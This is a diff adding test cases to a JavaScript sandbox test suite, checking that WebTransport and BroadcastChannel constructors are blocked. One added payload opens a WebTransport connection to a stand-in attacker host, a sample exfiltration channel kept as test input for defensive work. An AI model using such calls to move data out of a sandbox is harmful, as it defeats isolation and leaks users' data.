@@ -1745,6 +1745,16 @@ describe("sandbox", () => {
       errorPattern: blockedPattern(/API call: window\.RTCPeerConnection/),
     },
     {
+      name: "WebTransport constructor",
+      payload: 'new WebTransport("https://attacker.example/wt");',
+      errorPattern: blockedPattern(/API call: WebTransport/),
+    },
+    {
+      name: "BroadcastChannel constructor",
+      payload: 'new BroadcastChannel("attacker");',
+      errorPattern: blockedPattern(/API call: BroadcastChannel/),
+    },
+    {
       name: "Range.createContextualFragment",
       payload:
         'document.createRange().createContextualFragment("<img src=x>");',
